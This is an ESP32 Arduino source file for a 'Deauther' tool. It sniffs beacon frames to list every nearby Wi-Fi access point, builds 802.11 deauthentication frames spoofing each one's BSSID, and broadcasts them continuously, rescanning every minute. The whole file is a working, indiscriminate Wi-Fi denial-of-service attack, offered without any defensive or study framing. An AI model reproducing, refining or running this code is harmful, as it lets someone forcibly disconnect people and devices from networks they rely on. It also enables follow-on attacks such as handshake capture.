#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

// === PARAMETERS ===
const int SIZE_LIMIT    = 50;  // max number of APs to track
const int CHANNEL_LIMIT = 14;  // channels 1–14
const unsigned long DEAUTH_CYCLE = 60000;  // ms between rescans
const int  PACKET_LIMIT = 500; // per‐channel packet cap per AP

// === DATA STRUCTURES ===
struct AccessPoint {
  String    essid;
  int8_t    rssi;
  uint8_t   bssid[6];
  bool      lim_reached;
  bool      found;
  int       channel;
  int       channels[CHANNEL_LIMIT];
  uint8_t   deauthPacket[26];
};

AccessPoint aps[SIZE_LIMIT];
int current = -1;
int longest_essid = 0;
int set_channel = 1;
unsigned long last_deauth_time = 0;

// === UTILITY: build a standard deauth packet template ===
void initDeauthPacket(AccessPoint &ap) {
  // 802.11 deauth frame
  uint8_t hdr[] = {
    0xC0, 0x00,             // type = deauth
    0x00, 0x00,             // duration
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // dest (will be overwritten)
    0xCC,0xCC,0xCC,0xCC,0xCC,0xCC, // src (will be overwritten)
    0xCC,0xCC,0xCC,0xCC,0xCC,0xCC, // BSSID (will be overwritten)
    0x00,0x00,             // seq
    0x01,0x00              // reason = unspecified
  };
  memcpy(ap.deauthPacket, hdr, sizeof(hdr));
  // patch in the BSSID
  memcpy(&ap.deauthPacket[10], ap.bssid, 6);
  memcpy(&ap.deauthPacket[16], ap.bssid, 6);
}

// === ADD OR UPDATE AN AP IN OUR LIST ===
bool addOrUpdateAP(const uint8_t *bssid, int channel, const String &essid, int8_t rssi) {
  // try to find existing
  for (int i = 0; i <= current; i++) {
    if (memcmp(aps[i].bssid, bssid, 6) == 0) {
      // seen before → update stats
      AccessPoint &ap = aps[i];
      ap.found = true;
      if (!ap.lim_reached) {
        if (++ap.channels[channel-1] >= PACKET_LIMIT) {
          ap.lim_reached = true;
        }
        // pick most‐frequent channel so far
        int best = 0;
        for (int c = 1; c < CHANNEL_LIMIT; c++)
          if (ap.channels[c] > ap.channels[best]) best = c;
        if (ap.channel != best+1) {
          ap.channel = best+1;
          Serial.printf("%s → channel changed to %d\n",
                        ap.essid.c_str(), ap.channel);
        }
      }
      return false;
    }
  }
  // new AP → append
  current = (current + 1) % SIZE_LIMIT;
  AccessPoint &ap = aps[current];
  ap.essid       = essid;
  ap.rssi        = rssi;
  ap.channel     = channel;
  ap.lim_reached = false;
  ap.found       = true;
  memset(ap.channels, 0, sizeof(ap.channels));
  ap.channels[channel-1] = 1;
  memcpy(ap.bssid, bssid, 6);
  initDeauthPacket(ap);
  if ((int)essid.length() > longest_essid) longest_essid = essid.length();
  Serial.printf("New AP #%d: %s  BSSID %02x:%02x:%02x:%02x:%02x:%02x  CH=%d  RSSI=%d\n",
                current+1,
                essid.c_str(),
                bssid[0],bssid[1],bssid[2],
                bssid[3],bssid[4],bssid[5],
                channel, rssi);
  return true;
}

// === CLEAN UP APs NOT FOUND DURING LAST SCAN ===
void cleanAPList() {
  for (int i = 0; i <= current; i++) {
    if (!aps[i].found) {
      Serial.printf("[!] Removing AP %s #%d\n", aps[i].essid.c_str(), i);
      // swap with last
      aps[i] = aps[current];
      current--;
      i--; // re-check this index
    }
  }
}

// === SHOW WHICH APs WILL BE DEAUTHSENT ===
void showDeauthList() {
  Serial.println("====== Deauth targets ======");
  for (int i = 0; i <= current; i++) {
    AccessPoint &ap = aps[i];
    Serial.printf("CH %2d | %-*s | BSSID %02x:%02x:%02x:%02x:%02x:%02x\n",
                  ap.channel,
                  longest_essid, ap.essid.c_str(),
                  ap.bssid[0],ap.bssid[1],ap.bssid[2],
                  ap.bssid[3],ap.bssid[4],ap.bssid[5]);
  }
  Serial.println("============================");
}

// === SEND A SINGLE DEAUTH PACKET ===
void sendDeauth(const AccessPoint &ap) {
  esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, ap.deauthPacket, sizeof(ap.deauthPacket), false);
}

// === PROMISCUOUS CALLBACK ===
void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  auto *ppkt = (wifi_promiscuous_pkt_t*) buf;
  const uint8_t *payload = ppkt->payload;
  int len = ppkt->rx_ctrl.sig_len;
  // only handle beacons (type=MGMT, subtype=0x80) which are ≥ 38 bytes + ESSID
  if (type == WIFI_PKT_MGMT && len > 38 && payload[0] == 0x80) {
    uint8_t bssid[6];
    memcpy(bssid, payload + 10, 6);
    int ssid_len = payload[37];
    String essid;
    for (int i = 0; i < ssid_len; i++) {
      char c = payload[38 + i];
      if (isPrintable(c)) essid += c;
      else break;
    }
    int8_t rssi = ppkt->rx_ctrl.rssi;
    addOrUpdateAP(bssid, set_channel, essid, rssi);
  }
}

// === SCAN ACROSS ALL CHANNELS ===
void scanAPs() {
  // clear found flags
  for (int i = 0; i <= current; i++) aps[i].found = false;
  // cycle channels twice
  for (int pass = 0; pass < 2; pass++) {
    for (int ch = 1; ch <= CHANNEL_LIMIT; ch++) {
      set_channel = ch;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      Serial.printf("Scanning channel %d...\n", ch);
      delay(1000);
    }
  }
  Serial.println("Scan complete.");
  cleanAPList();
}

// === SETUP ===
void setup() {
  Serial.begin(115200);
  delay(2000);
  Serial.println("\n=== ESP32 Deauther CLI ===");

  // init WiFi in promiscuous mode
  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

  // initial scan + schedule first deauth
  scanAPs();
  showDeauthList();
  last_deauth_time = millis();
}

// === MAIN LOOP ===
void loop() {
  // time to rescan?
  if (millis() - last_deauth_time > DEAUTH_CYCLE) {
    Serial.println("[*] Rescanning all channels...");
    scanAPs();
    showDeauthList();
    last_deauth_time = millis();
  }
  // send one deauth per AP each loop
  for (int i = 0; i <= current; i++) {
    sendDeauth(aps[i]);
  }
  delay(1);
}
